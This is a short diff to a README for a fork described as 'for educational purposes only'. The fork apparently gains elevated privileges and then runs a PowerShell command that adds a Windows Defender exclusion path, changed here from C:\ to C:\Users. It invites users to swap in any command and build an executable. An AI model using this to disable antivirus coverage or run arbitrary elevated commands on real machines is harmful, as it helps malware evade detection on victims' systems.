@@ -8,6 +8,6 @@ This fork was made for educational purposes only.
 
 It runs powershell when it gets elevated then
 
-```Add-MpPreference -ExclusionPath "C:\"```
+```Add-MpPreference -ExclusionPath "C:\\Users"```
 
 Feel free to change the command to anything and run the workflow to get the exe.
